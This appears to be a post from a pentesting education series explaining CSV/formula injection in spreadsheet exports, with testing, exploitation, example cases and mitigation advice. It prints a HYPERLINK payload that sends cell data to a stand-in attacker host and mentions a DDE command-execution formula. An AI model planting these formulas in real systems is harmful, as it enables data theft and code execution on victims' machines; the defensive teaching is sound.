# Day 46 — CSV/Formula Injection: The Export Feature That Attacks Whoever Opens It

**Severity:** Medium → High | **Category:** Injection | **Series:** #FromDevToAttacker

---

## 🔍 What It Is

When user-supplied data containing a leading `=`, `+`, `-`, or `@` character gets written unmodified into a CSV export, spreadsheet software (Excel, Google Sheets, LibreOffice Calc) interprets that field as a formula rather than plain text the moment the file is opened — letting an attacker plant a formula in something as simple as a "name" field that later executes when a staff member exports and opens the data.

## 🌱 Why It Exists

CSV export features are built to faithfully reproduce whatever text is in the underlying field — that's the entire purpose of an export — and there's no natural reason for a developer building an export function to think about spreadsheet formula syntax specifically, since the vulnerability isn't in the web application at all; it's in how a completely separate piece of software (the spreadsheet program) chooses to interpret plain-text CSV content on open.

## ⚔️ How To Find It

The test is simply submitting a value beginning with a formula-trigger character into any field that later appears in a CSV/Excel export — a user's name field, a comment, an order note — and confirming the exported file contains that value verbatim, unescaped.

```
Name field submitted:  =HYPERLINK("http://attacker.com/steal?d="&A1,"Click")
```

Confirm by actually opening the resulting export in a spreadsheet application rather than just inspecting the raw CSV text, since the vulnerability only manifests at that final open step.

## 💥 How To Exploit It

`=HYPERLINK()` formulas create a clickable link disguised as ordinary text — useful for phishing staff who export and browse the data. More severe formula chains (`=cmd|'/c calc'!A1`-style DDE injection, historically) can achieve local code execution on the machine opening the file, though modern spreadsheet software has increasingly restricted this by default; regardless, the data-exfiltration variant via `HYPERLINK` or `WEBSERVICE` formulas referencing an attacker-controlled URL remains broadly effective.

## 🌍 Where This Actually Bites

In a **banking**-adjacent client's customer-onboarding system, the "company name" field on a business account application was exported directly into a compliance-review spreadsheet used by the operations team — a formula planted there would have executed the moment a compliance analyst opened that day's export, a genuinely plausible attack path given how routine that export was. In **freight logistics**, shipment notes fields exported into a nightly operations report created the same risk — a formula in a shipment note field, submitted by any customer with order-placement access, could reach an internal analyst's spreadsheet software entirely automatically as part of routine reporting.

## 📋 How To Report It

Grade Medium to High depending on who opens the export and how routinely — an export consumed only by developers debugging an issue is lower risk than one that's part of a daily operational workflow for non-technical staff, since the latter has a much higher realistic chance of actually being opened and triggering the formula. Recommend prefixing any field beginning with `=`, `+`, `-`, or `@` with a single quote or tab character before writing it to CSV output — this is the standard, low-effort mitigation, and note in the report that it needs to be applied at every export function independently, since this is rarely centralized in one place across a codebase.

---

*Part of the #FromDevToAttacker series — real field notes from enterprise Web App &
API pentesting, one day at a time.*
